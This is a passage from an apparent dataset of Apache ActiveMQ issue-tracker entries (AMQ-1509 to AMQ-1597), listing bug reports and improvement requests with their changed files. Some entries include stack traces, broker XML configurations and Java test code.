org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:1400)        at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:513)        at org.apache.activemq.broker.BrokerService.addConnector(BrokerService.java:187)        at org.apache.activemq.broker.BrokerService.addConnector(BrokerService.java:177)        at be.amaris.eda.EDAManager.startBroker(EDAManager.java:38)        at be.amaris.eda.EDAManager.main(EDAManager.java:17)
issueID:AMQ-1509
type:Bug
changed files:ConduitBridge.java
DemandSubscription.java
texts:Duplicate topic messages received with network of brokers and selectors
If you create a network of two brokers, A and B, one publisher publishing to A, and n (where n is > 1) receivers with selectors, each receiver recieves n messages for every 1 message sent.  The key here is to have a selector.   It would appear that the conduitSubscriptions flag does not work when using selectors.  The conduit does not properly reconcile consumers if they have selectors.  A suggested soltuion would be that ather than process each selector independantly, each selector should be or"ed together and if any selector results in true then a single message should be sent to the other broker.In doing research, it would appear that this problem was introduced with bug fix AMQ-810.  Another user reported it via email back to the assignee of AMQ-810 and a short dialog transpired.  See http://www.mail-archive.com/activemq-users@geronimo.apache.org/msg05198.html.
issueID:AMQ-1510
type:Bug
changed files:PolicyEntry.java
DestinationViewMBean.java
DestinationFilter.java
DurableTopicSubscription.java
BrokerView.java
TopicRegion.java
RegionBroker.java
BrokerViewMBean.java
DestinationFactoryImpl.java
Topic.java
Queue.java
Message.java
BaseDestination.java
DestinationView.java
Destination.java
texts:Incorrect value for QueueCount attribute after broker restart
When using a persistent broker with AMQ message store, the QueueCount attribute on those queues which have messages in them has incorrect value after the broker is restarted. Although the messages can be viewed by browsing the queue, the web console as well as the JMX console display a value of zero for the queue once the broker is restarted.Both consoles should display the count of the number of messages in the queue accurately in the QueueCount attribute after the broker restarts.
issueID:AMQ-1511
type:Bug
changed files:BrokerService.java
MasterConnector.java
texts:Slave starts connectors before master fails
A broker configured as a slave starts its connectors before the the master fails.  This is bad because a) The documentation states that this is not the case.  b) it shouldn"t be the case because you don"t want clients to be able to connect to the slave until it takes over as master.In looking at source, it would appear that the MasterConnector of BrokerService is not started until after all the connections are started in startAllConnection().  Unfortunately, to determine if connections should be started, isSlave() is called which relies on the MasterConnector.start() method being called.  The MasterConnector service start() method needs to be called first before isSlave will work.See broken code snippet from BrokerService below:protected void startAllConnectors() throws Exception{  if (Unable to render embedded object: File (isSlave()){   // OOPS) not found.!! isSlave asks the MasterConnector if the master is active, but can"t until its started     ...       if (services != null) {                for (int i = 0; i < services.length; i++) {                    Service service = services[i];   //OOPS, MasterConnector is in this list and the surrounding if relies on it to be started                    configureService(service);                    service.start();   //OOPS!!!!   this should have been called for isSlave() to return the right answer.                }            }   }
issueID:AMQ-1512
type:Bug
changed files:InactivityMonitor.java
texts:InactivityMonitor hangs raising an exception
Deadlock caused by synching the readchecker object before throwing an Inactivity Exception
issueID:AMQ-1513
type:Improvement
changed files:
texts:Improve docs for the build.xml for the examples
Add documentation for the available options to the consumer and the producer.
issueID:AMQ-1514
type:Improvement
changed files:HttpClientTransport.java
HttpTransportFactory.java
HttpTransportSupport.java
HttpTunnelServlet.java
texts:patch HTTP connector to support proxy authentication if proxyUsername and proxyPassword provided.
Could not find a way to configure an http proxy host/port with user/pass authentication. I am supplying a patch to allow this to be part of the options specified as part of the URI, for example, uri="static://(http://myserver:80?proxyHost=my.proxy.com%26proxyPort=80%26proxyUsername=username%26proxyPassword=password)"This is an enhancement based on #AMQ-1099.
issueID:AMQ-1515
type:Improvement
changed files:ClassLoadingAwareObjectInputStream.java
BaseDataStreamMarshaller.java
OpenWireFormat.java
ClassLoading.java
texts:Removed use of ClassLoading
Noticed you"re using the propagated ClassLoading class.  That thing was never needed, Class.forName(String, boolean, ClassLoader) always had the correct functionality.Here"s a patch if you want it.
issueID:AMQ-1517
type:New Feature
changed files:ActiveMQSession.java
ActiveMQConnectionFactory.java
ActiveMQMessageProducerSupport.java
ActiveMQQueueSender.java
ActiveMQMessageProducer.java
ActiveMQTopicPublisher.java
ActiveMQConnection.java
texts:Support for more graceful handling of timeouts within MessageProducer.send
We are using queue limits with a SEDA style architecture. We have certain queues which are machine specific in our storage solution so if the storage machine was to crash for whatever reason there is the possibility that our failure detection could happen after we have filled the queue up meaning we have deadlocked our workflow. It would be nice if we could put a timeout on a MessageProducer.send();The desired behavior for sending when queue limits are reached would be able to configure a producer to do any of the following three things:1. Block until under the queue limit. This is current behavior. 2. Have a timeout value. 3. Throw an exception immediately.
issueID:AMQ-1518
type:Bug
changed files:TaskRunnerFactory.java
texts:NetworkConnector is leaking a thread if broker disconnects
Consider the following scenario: Two brokers A and B. Broker B sets up a NetworkConnector to Broker A using a static URL list and setting duplex ="true" (see attached configuration). At runtime Broker B will correctly connect to Broker A. jconsole shows a NetworkBridge being set up.For every network bridge that gets set up, three threads get started in Broker A, e.g:VMTransport: vm://localhost#5ActiveMQ Transport: tcp://host:4533ActiveMQ Connection Dispatcher: /host:4533Now, when Broker B disconnects, the network bridge will be closed down and the above threads need to cleaned up. The first two threads do get closed correctly, however the Connection Dispatcher thread stays alive and does not get closed. We are leaking this thread!
issueID:AMQ-1519
type:Bug
changed files:ActiveMQResourceAdapter.java
texts:Broker Should be started async to avoid a slave broker from blocking the startup of J2EE server (like JBoss)
See discussion thread: http://www.nabble.com/jdbcPersistence-behaviour-tp13696937s2354p14298283.html
issueID:AMQ-1521
type:Bug
changed files:
texts:Acknowledgement of messages across a duplex network does not work correctly
MessageAcks do not get sent across a duplex network for al scenarios
issueID:AMQ-1524
type:Bug
changed files:ActiveMQConnection.java
texts:Thread name spelling mistake: "AcitveMQ Connection Worker"
Just noticed this in a thread dump.  Line 199 in ./activemq-core/src/main/java/org/apache/activemq/ActiveMQConnection.java has a spelling mistake.
issueID:AMQ-1525
type:Bug
changed files:
texts:InactivityMonitor incorrectly assumes there isn&#39;t activity on a Transport
None
issueID:AMQ-1528
type:Bug
changed files:HashPageInfo.java
HashBin.java
AbstractSubscription.java
HashIndex.java
texts:HasPage overflow results in indexOutOfBoundsException in AMQStore
None
issueID:AMQ-1533
type:Bug
changed files:KahaTopicReferenceStore.java
texts:Can not unsubscribe topic
NullPointerException throw by org.apache.activemq.store.kahadaptor.KahaTopicReferenceStore   removeSubscriberMessageContainer
issueID:AMQ-1540
type:Improvement
changed files:package.html
DurableSubscriberFacade.java
DestinationFacade.java
SendMessage.java
CreateSubscriber.java
texts:Patch to trim spaces from entry fields in web console app
Certain actions within the web console will not work properly with any leading/trailing spaces in entry fields.  The attached patch will remove leading and trailing spaces from most fields.  (I left out space trimming from the message text field of send message--because that could be meaningful.)
issueID:AMQ-1541
type:New Feature
changed files:AdvisorySupport.java
MutableBrokerFilter.java
BrokerService.java
RegionBroker.java
AdvisoryBroker.java
JDBCPersistenceAdapter.java
Broker.java
ErrorBroker.java
EmptyBroker.java
BrokerFilter.java
AMQPersistenceAdapter.java
texts:Request for notification on failover in master/slave configuration
There should be a way to register with a broker for notification upon it gaining control as the new master in a master/slave configuration.
issueID:AMQ-1542
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:NetworkConnector parameters are not passed back over a duplex connection
This issue has been described in the following mainly pertaining to networkTTL parameter but this bug actually affects all parameters one wishes to propagate to the remote broker via a duplex connection.see: http://www.nabble.com/NetworkTTL-and-Duplex-Problem-to14428941s2354.html
issueID:AMQ-1547
type:New Feature
changed files:
texts:JMS Selectors can be created for Ajax/REST Servlet clients.
MessageListenerServlet and MessageServlet will look for a request header or a session attribute which will contan the SQL92Selector. The name of the header/attribute is confihured on the web.xml as a context parameter.
issueID:AMQ-1552
type:Improvement
changed files:
texts:add a spring factory bean to make it easy to unify the failover policy across every ActiveMQConnectionFactory instance if the connection URL differs across parts of your application
This is a little helper class which just allows you to get failover for free without having to worry about the URI syntax
issueID:AMQ-1553
type:Bug
changed files:RegionBroker.java
AdvisoryBroker.java
Topic.java
Queue.java
ProducerEventSource.java
SimpleDispatchPolicy.java
QueueSubscription.java
BaseDestination.java
texts:Queue structure pagedInMessages can hold upto 1000 messages for a long time
Queue structure pagedInMessages can hold upto 1000 messages for a long time. This can result in broker memory bloat if the messages are largeMessages from the pagedInMessages list need to be removed asap.
issueID:AMQ-1556
type:Bug
changed files:ActiveMQMessageConsumer.java
texts:Concurrency Issue on MessageConsumer deliveredMessages
The LinkedList can be modified concurrently - see http://www.nabble.com/NPE-while-consuming-messages-to12301153s2354.html
issueID:AMQ-1559
type:Bug
changed files:AMQTopicMessageStore.java
texts:AMQStore cannot resolve message references for Durable Topic Subscribers
This happens intermittently
issueID:AMQ-1560
type:Bug
changed files:
texts:amqPersistence store grows continuously
Under certain conditions, the data log files in the journal may not get cleared properly
issueID:AMQ-1562
type:Bug
changed files:PolicyEntry.java
QueueStorePrefetch.java
FilePendingSubscriberMessageStoragePolicy.java
DestinationViewMBean.java
DurableTopicSubscription.java
BrokerView.java
StoreDurableSubscriberCursor.java
PendingSubscriberMessageStoragePolicy.java
StorePendingDurableSubscriberMessageStoragePolicy.java
RegionBroker.java
BrokerViewMBean.java
VMPendingDurableSubscriberMessageStoragePolicy.java
TopicSubscription.java
TempQueueRegion.java
StorePendingQueueMessageStoragePolicy.java
FilePendingDurableSubscriberMessageStoragePolicy.java
PendingQueueMessageStoragePolicy.java
DestinationFactoryImpl.java
FilePendingMessageCursor.java
Topic.java
Queue.java
VMPendingQueueMessageStoragePolicy.java
VMPendingSubscriberMessageStoragePolicy.java
BaseDestination.java
FilePendingQueueMessageStoragePolicy.java
DestinationView.java
StoreQueueCursor.java
PendingDurableSubscriberMessageStoragePolicy.java
texts:Queue Pending Message Cursor doesn&#39;t adequately release cache when no space left
The QueueStorePrefetch releases messages from its cache when there is no memory space left - however - whilst sending to a Queue the RegionBroker will block before the QueueStorePrefetch is notified.
issueID:AMQ-1565
type:Bug
changed files:pom.xml
BrokerFactory.java
texts:Exception String from BrokerFactory has a typo - "Could load " should presumably read "Could not load "
The error message I get is this:java.io.IOException: Could load xbean factory:java.lang.NoClassDefFoundError: org/springframework/core/io/FileSystemResource        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:27)presuambly the error should be that the class could not load the xbean factory
issueID:AMQ-1566
type:Bug
changed files:
texts:Out of order messages can be dispatched out of order for durable topic subscriptions under load
There is timing issue when the PrefetchSubscription flips from dispatching paged in messages to direct dispatch and back again which can result in messagesbeing dispatched out of order
issueID:AMQ-1567
type:Improvement
changed files:
texts:Stomp frame translator improvements
added Spring context for marshaller changed header semantics, e.g jms-xml to jms-object-xml added support for map and byte messages added "transformation error" header ignored jms object "transformation" header
issueID:AMQ-1572
type:New Feature
changed files:FailoverTransport.java
texts:Add the option for a backup channel that is already connected for the Failover transport
By having an already established transport as backup in the fault tolerant transport, if a failure occurs - then failover can be accomplished more quickly
issueID:AMQ-1576
type:Bug
changed files:ActiveMQMessageTransformation.java
ActiveMQMessage.java
texts:ActiveMQMessageTransformation.copyProperties NullPointerException
org.apache.activemq.ActiveMQMessageTransformation copyProperties method doesn"t check for null before calling setObjectProperty(...)This causes null pointer exceptions when trying to bridge Oracle"s AQ with ActiveMQ - Oracle returns a value of null for JMSXGroupSeq (and maybe others, that"s the first one that causes the failure).Since passing a null to setObjectProperty appears to inevitably fail (null pointer thrown from TypeConversionSupport.convert(...)) why not check for null and not call setObjectProperty?TypeConversionSupport even has an assert line that seems to indicate the value should never be null, but calling code (ActiveMQMessageTransformation in my case) doesn"t prevent that from happening.
issueID:AMQ-1578
type:Bug
changed files:PooledConnectionFactory.java
texts:No exposure to the &#39;idleTimeout&#39; property for ConnectionPool class, which makes it difficult to implement keepAlive semantics on PooledConnections
The ConnectionPool class has a "idleTimeout" property, but this is not accessible easily, via the PooledConnectionFactory class.This essentially means that there"s no easy way to implement a keepAlive setup for underlying tcp connections.  By default, the idleTimeout is set to 30 seconds, and when this expires, it shuts down the connection"s transport.  Furthermore, it ignores and knows nothing about the InactiviyMonitor"s efforts to keep the tcp connection refreshed.A simple fix would be to have the PooledConnectionFactory have a setter for the idleTimeout property, and then pass this one when it creates new connections.   As a work-around, I"ve created a sub-class of the PooledConnectionFactory class, that looks like this (this sub-classes actually the jencks amqpool class, which is very similar to the activemq version of the class, which has the same issue):public class PooledConnectionFactoryWithIdleTimeout extends PooledConnectionFactory {   private int idleTimeout = 0;    public int getIdleTimeout() {       return idleTimeout;   }   public void setIdleTimeout(int idleTimeout) {       this.idleTimeout = idleTimeout;   }    @Override   protected ConnectionPool createConnectionPool(ActiveMQConnection connection) {       ConnectionPool connPool = new ConnectionPool(connection, getPoolFactory());       connPool.setIdleTimeout(idleTimeout);              return connPool;   }   }
issueID:AMQ-1580
type:Bug
changed files:
texts:ArrayOutOfBoundsException in ActiveMQInputStream
When using JMS streaming, an ArrayOutOfBoundsException occurs in ActiveMQInputStream if the length of the streamed content is exactly a multiple of the chunk size sent by ActiveMQOutputStream (64KB at the moment).The last message received by fillBuffer in such a case has a bodyLength of 0, so  buffer = new byte&#91;0&#93;; // line 225  pos = 0; // line 227and in the next invocation of read()  return buffer&#91;pos&#93;; // line 180fails with:  java.lang.ArrayIndexOutOfBoundsException: 0 at org.apache.activemq.ActiveMQInputStream.read(ActiveMQInputStream.java:180) at Crash.main(Crash.java:54)Attached is Crash.java which produces the exception.
issueID:AMQ-1583
type:Bug
changed files:StoreDurableSubscriberCursor.java
texts:Creating a durable subscriber throws ConcurrentModificationException
My JMS application uses a single topic and few hundred durable subscribers. While some of the consumers are already receiving messages, others are created. During the creation of one of the durable subscribers, a java.util.ConcurrentModificationException in the size() method of org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor occured. Here"s the stack trace:javax.jms.JMSException: java.util.ConcurrentModificationException        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1181)        at org.apache.activemq.ActiveMQSession.syncSendPacket(ActiveMQSession.java:1749)        at org.apache.activemq.ActiveMQMessageConsumer.<init>(ActiveMQMessageConsumer.java:215)        at org.apache.activemq.ActiveMQTopicSubscriber.<init>(ActiveMQTopicSubscriber.java:117)        at org.apache.activemq.ActiveMQSession.createDurableSubscriber(ActiveMQSession.java:1164)        at de.dpwn.bde.bms.optima.service.eventreceiver.DeviceListenerThread.<init>(DeviceListenerThread.java:98)        at de.dpwn.bde.bms.optima.service.eventreceiver.EventReceiverService.addDeviceListener(EventReceiverService.java:184)        at de.dpwn.bde.bms.optima.device.DeviceFactory.getBinDevice(DeviceFactory.java:463)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:597)        at de.dpwn.bde.bms.optima.service.eventreceiver.EventCaller.call(EventCaller.java:124)        at de.dpwn.bde.bms.optima.service.eventreceiver.ConfigListenerThread.run(ConfigListenerThread.java:126)Caused by: java.util.ConcurrentModificationException        at java.util.LinkedList$ListItr.checkForComodification(LinkedList.java:761)        at java.util.LinkedList$ListItr.next(LinkedList.java:696)        at org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.size(StoreDurableSubscriberCursor.java:236)        at org.apache.activemq.broker.region.PrefetchSubscription.getPendingQueueSize(PrefetchSubscription.java:392)        at org.apache.activemq.broker.region.DurableTopicSubscription.getPendingQueueSize(DurableTopicSubscription.java:207)        at org.apache.activemq.broker.region.DurableTopicSubscription.toString(DurableTopicSubscription.java:229)        at java.lang.String.valueOf(String.java:2827)        at java.lang.StringBuilder.append(StringBuilder.java:115)        at org.apache.activemq.broker.region.DurableTopicSubscription.activate(DurableTopicSubscription.java:97)        at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:103)        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:372)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:85)        at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:81)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:85)        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:95)        at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:525)        at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:334)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:281)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:100)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:200)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:118)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:42)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)        at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-1584
type:Bug
changed files:ClassLoadingAwareObjectInputStream.java
texts:ClassLoadingAwareObjectInputStream cannot load primary classes
When deserializing a message contents the ClassLoadingAwareObjectInputStream loads any missing classes. However, it cannot load the classes that correspond with the primitive types, i.e. when a class named "int" is to be loaded it does not return int.class but instead throws a ClassNotFoundException.A patch is attached. The princple has been copied from ObjectInputStream.
issueID:AMQ-1585
type:Bug
changed files:MasterBroker.java
texts:Problems with pure master/slave configuration
As posted in the AMQ user forum:http://www.nabble.com/Problems-with-Pure-Master-Slave-in-AMQ-5.0.0-to15471491s2354.html#a15474769-------------------Hi all,I am having trouble setting up a stable ActiveMQ Pure Master/Slave topology.Initially I have tried v4.1.1 which failed with an exception. I found an AMQ JIRA ticket which said that Pure/Master slave didn"t work in v4.1.1.Ok, so I switched to AMQ 5.0.0, created 2 configs (master/slave, see end of message) and ran two AMQ instances (on the same box) and most of the times my test (see below) worked, but more often I get various error messages like: On the slave:ERROR Service                        - Async error occurred: javax.jms.JMSException: Slave broker out of sync with master: Dispatched message (ID:tbuckel-desktop-41814-1202886136210-0:0:565:1:1) was not in the pending listjavax.jms.JMSException: Slave broker out of sync with master: Dispatched message (ID:tbuckel-desktop-41814-1202886136210-0:0:565:1:1) was not in the pending list        at org.apache.activemq.broker.region.PrefetchSubscription.processMessageDispatchNotification(PrefetchSubscription.java:160)        at org.apache.activemq.broker.region.AbstractRegion.processDispatchNotification(AbstractRegion.java:381)        at org.apache.activemq.broker.region.RegionBroker.processDispatchNotification(RegionBroker.java:550)        at org.apache.activemq.broker.BrokerFilter.processDispatchNotification(BrokerFilter.java:201)        at org.apache.activemq.broker.BrokerFilter.processDispatchNotification(BrokerFilter.java:201)        at org.apache.activemq.broker.BrokerFilter.processDispatchNotification(BrokerFilter.java:201)        at org.apache.activemq.broker.MutableBrokerFilter.processDispatchNotification(MutableBrokerFilter.java:211)        at org.apache.activemq.broker.TransportConnection.processMessageDispatchNotification(TransportConnection.java:450)        at org.apache.activemq.command.MessageDispatchNotification.visit(MessageDispatchNotification.java:77)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:281)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:100)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:67)        at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:202)        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36) After having killed the master, stopped the slave, copied the slave"s data into the master"s data directory various error message came up (as described in the Master/Slave recovery section), e.g. (internal) ActiveMQ topics were not available, the admin webApp showed exceptions and errors on the client.The test I"ve created uses Spring 2.0.x and pumps 1000 MapMessages in a queue through Spring"s JmsTempate, each message is created within its own transaction, using JmsTransactionManager and TransactionTemplate.The created messages are consumed by an initially instantiated transactional DefaultMessageListenerContainer. The AMQ JARs in the test"s classpath are activemq-core-5.0.0.jar, geronimo-jms_1.1_spec-1.0.jar, geronimo-jta_1.0.1B_spec-1.0.jar as I"ve noticed a really bad performance when only using the activemq-all-5.0.0.jar (maybe this is the problem?).The test code work"s without problems with OpenMQ, but I"d prefer using the nice Pure Master/Active ActiveMQ if I can get it running in a stable config I would highly appreciate any help or suggestions. Maybe my config is wrong or I miss something essential. I"ve also tried a recent AMQ 5.1 SNAPSHOT which wasn"t better...See below for the small program i used to test (no unit test, behaviour appeared to be non deterministic to me and it"s not so nice as i"ve changed it quite often)Thanks in advance,Thomas<!-- MASTER config --><beans  xmlns="http://www.springframework.org/schema/beans"  xmlns:amq="http://activemq.org/config/1.0"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd  http://activemq.org/config/1.0 http://activemq.apache.org/schema/activemq-core.xsd  http://activemq.apache.org/camel/schema/spring http://activemq.apache.org/camel/schema/spring/camel-spring.xsd">  <bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"/>  <broker xmlns="http://activemq.org/config/1.0" brokerName="master" dataDirectory="${activemq.base}/data">    <destinationPolicy>      <policyMap>        <policyEntries>          <policyEntry topic="FOO.>" producerFlowControl="false" memoryLimit="1mb">            <dispatchPolicy>              <strictOrderDispatchPolicy/>            </dispatchPolicy>            <subscriptionRecoveryPolicy>              <lastImageSubscriptionRecoveryPolicy/>            </subscriptionRecoveryPolicy>          </policyEntry>        </policyEntries>      </policyMap>     </destinationPolicy>    <transportConnectors>       <transportConnector name="openwire" uri="tcp://tbuckel-desktop:7778" />    </transportConnectors>    <networkConnectors/>    <managementContext>       <managementContext connectorPort="1100" jmxDomainName="org.apache.activemq"/>    </managementContext>  </broker>  <commandAgent xmlns="http://activemq.org/config/1.0"/>  <jetty xmlns="http://mortbay.com/schemas/jetty/1.0">    <connectors>      <nioConnector port="8161" />    </connectors>    <handlers>      <webAppContext contextPath="/admin" resourceBase="${activemq.base}/webapps/admin" logUrlOnStart="true" />    </handlers>  </jetty></beans><!-- SLAVE config --><beans  xmlns="http://www.springframework.org/schema/beans"  xmlns:amq="http://activemq.org/config/1.0"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd  http://activemq.org/config/1.0 http://activemq.apache.org/schema/activemq-core.xsd  http://activemq.apache.org/camel/schema/spring http://activemq.apache.org/camel/schema/spring/camel-spring.xsd">  <bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"/>  <broker xmlns="http://activemq.org/config/1.0" brokerName="slave" dataDirectory="${activemq.base}/data-slave"          masterConnectorURI="tcp://tbuckel-desktop:7778">    <destinationPolicy>      <policyMap>        <policyEntries>          <policyEntry topic="FOO.>" producerFlowControl="false" memoryLimit="1mb">            <dispatchPolicy>              <strictOrderDispatchPolicy/>            </dispatchPolicy>            <subscriptionRecoveryPolicy>              <lastImageSubscriptionRecoveryPolicy/>            </subscriptionRecoveryPolicy>          </policyEntry>        </policyEntries>      </policyMap>    </destinationPolicy>    <transportConnectors>       <transportConnector name="openwire" uri="tcp://localhost:7779"/>    </transportConnectors>    <networkConnectors/>    <managementContext>       <managementContext connectorPort="1101" jmxDomainName="org.apache.activemq"/>    </managementContext>  </broker>  <commandAgent xmlns="http://activemq.org/config/1.0"/>  <jetty xmlns="http://mortbay.com/schemas/jetty/1.0">    <connectors>      <nioConnector port="8162" />    </connectors>    <handlers>      <webAppContext contextPath="/admin" resourceBase="${activemq.base}/webapps/admin" logUrlOnStart="true" />    </handlers>  </jetty></beans>------------Test code:import org.apache.activemq.ActiveMQConnectionFactory;import org.springframework.jms.connection.JmsTransactionManager;import org.springframework.jms.connection.TransactionAwareConnectionFactoryProxy;import org.springframework.jms.core.JmsTemplate;import org.springframework.jms.core.MessageCreator;import org.springframework.jms.listener.DefaultMessageListenerContainer;import org.springframework.transaction.TransactionStatus;import org.springframework.transaction.support.TransactionCallbackWithoutResult;import org.springframework.transaction.support.TransactionTemplate;import javax.jms.*;import java.math.BigInteger;import java.util.ArrayList;import java.util.List;import java.util.concurrent.TimeUnit;public class AnotherFailoverTest {    public static final int MESSAGES = 1000;    private final static List<BigInteger> notConsumedMessages = new ArrayList<BigInteger>(MESSAGES);    private static ConnectionFactory createCF() throws Exception {        ActiveMQConnectionFactory cf = new ActiveMQConnectionFactory();        cf.setBrokerURL("failover://(tcp://localhost:7778,tcp://localhost:7779)?randomize=false");        return new TransactionAwareConnectionFactoryProxy(cf);    }    private static void send() throws Exception {        JmsTransactionManager transactionManager = new JmsTransactionManager();        transactionManager.setConnectionFactory(createCF());        transactionManager.afterPropertiesSet();        int i=0;        do {            i++;            final int number = i;            try {                final BigInteger v = new BigInteger(Integer.toString(number));                TransactionTemplate tt = new TransactionTemplate(transactionManager);                tt.execute(new TransactionCallbackWithoutResult() {                    protected void doInTransactionWithoutResult(TransactionStatus status) {                        final JmsTemplate template = new JmsTemplate(pcf);                        template.setSessionTransacted(true);                        template.afterPropertiesSet();                        template.send("testqueue", new MessageCreator() {                            public Message createMessage(Session session) throws JMSException {                                ObjectMessage dummyMessage = session.createObjectMessage();                                dummyMessage.setObject(v);                                synchronized (notConsumedMessages) {                                    notConsumedMessages.add(v);                                }//                                System.out.println("Created message " + number + "(" + notConsumedMessages.size() + ")");                                return dummyMessage;                            }                        });                    }                });            } catch (Exception e) {                e.printStackTrace();                System.out.println("Error creating message " + number);            }        } while (i < MESSAGES);    }    private static void setupReceiver() throws Exception {        JmsTransactionManager transactionManager = new JmsTransactionManager();        transactionManager.setConnectionFactory(createCF());        transactionManager.afterPropertiesSet();        final DefaultMessageListenerContainer container = new DefaultMessageListenerContainer();        container.setConnectionFactory(pcf);        container.setTransactionManager(transactionManager);        container.setMessageListener(new MessageListener() {            public void onMessage(Message message) {                try {                    ObjectMessage msg = (ObjectMessage) message;                    BigInteger number = (BigInteger) msg.getObject();                    synchronized (notConsumedMessages) {                        if (!notConsumedMessages.remove(number)) {                           System.err.println("Message " + number + " not found in list!");                        } else {   //                        System.out.println("Consumed message " + number);                       }                   }                } catch (JMSException e) {//                    e.printStackTrace();                    System.out.println("Error consuming message!");                }            }        });        container.setSessionTransacted(true);        container.setDestinationName("testqueue");        container.setExceptionListener(new ExceptionListener() {            public void onException(JMSException jmsException) {                System.err.println(jmsException);            }        });        container.afterPropertiesSet();        container.initialize();        TimeUnit.SECONDS.sleep(1);    }    public static void main(String[] args) throws Exception {        long start = System.currentTimeMillis();        setupReceiver();        send();        int remainingSize = 0;        do {            Thread.sleep(500);            synchronized (notConsumedMessages) {                remainingSize = notConsumedMessages.size();            }            System.out.println("Unconsumed " + remainingSize + ": " + sb);        } while (remainingSize > 0);        System.out.println("All messages consumed.");        long end = System.currentTimeMillis();        System.out.println((end-start));        System.exit(0);    }}
issueID:AMQ-1587
type:Improvement
changed files:LdapNetworkConnector.java
texts:Improvements/Bug Fixes for LDAP Discovery Mechanism (LDAP Network Connector)
These are much needed improvements and bug fixes for the AMQ-358.  The original patch worked for only a subset of cases.  I have updated the original network connector I submitted with the following features and fixes. detection and handling of multiple LDAP entries pointing to the same upstream broker anonymous binding support (not everyone wants to put their login credentials in an XML file!) LDAP server failover support general logging improvements fix bug that only allowed a single discovered network connector from a broker persistent search capabilities allowing a broker to stay in sync with the LDAP server entries (only works for LDAP servers who support the extensions defined in draft-ietf-ldapext-psearch-03.txt)
issueID:AMQ-1591
type:Bug
changed files:JDBCPersistenceAdapter.java
texts:When using a JDBC based database locker in an Master/Slave configuration, the lock is not updated.
The lockKeepAlivePeriod field was intialized to 0 and no accessors are provided to initialize it.
issueID:AMQ-1593
type:Bug
changed files:
texts:redeliveryCounter not updated correctly when using XA transactions and Spring
When using ActiveMQ 5 in combination with XA, I noticed that redelivery of messages is not correctly performed. I am using XA in combination with Spring"s DefaultMessageListenerContainer (DMLC) and have a simple test case in which the MessageListener throws an IllegalStateException which triggers a transaction rollback. After that, the message is redelivered, but unfortunately not as many times as my redelivery policy specifies. I am using the following settings: maximumRedeliveries=3 initialRedeliveryDelay=10If I am not mistaken this means I should receive the message 4 times (once initially and then three times redelivered), but I only get it three times. When I log the messages I receive prior to throwing an ISE, I see the following "inconsistency" with the redeliveryCounter: the initial message has a counter value of 0, the first redelivery message has a counter value of 2 and the second redelivery message has a counter value of 4. After that, I do not receive an additional message.I created a simple test case attached to this issue (a Maven 2 project) which is configured with the above settings and shows the described behavior. In order to run the test case, however, you need the Bitronix Transaction Manager (v 1.2) in your local repository (since it is currently not listed in one of the public repositories, you have to download it and put it manually into the local repo). The download url is http://dist.codehaus.org/btm/1.2/btm-dist-1.2.zip and installation is done by unzipping the archive and usingmvn -Dfile=btm-1.2.jar -DgroupId=btm -DartifactId=btm -Dversion=1.2 -DgeneratePom=true -Dpackaging=jar install:install-file to copy it to the repo.Spring"s DMLC is set to a cacheLevel of 0 (CACHE_NONE) if an external transaction manager is used. If I change the cacheLevel to 2 (CACHE_SESSION) then the correct number of messages is delivered and the counter is correctly updated, so I am not sure whether this is an issue with ActiveMQ or Spring. Anyways, I think I should not loose any messages if I use XA, regardless of the cacheLevel setting...
issueID:AMQ-1595
type:Bug
changed files:AMQPersistenceAdapter.java
texts:java.lang.OutOfMemoryError when restarting a broker that had a durable subscirption that had been sent lots of messages.
None
issueID:AMQ-1597
type:Improvement
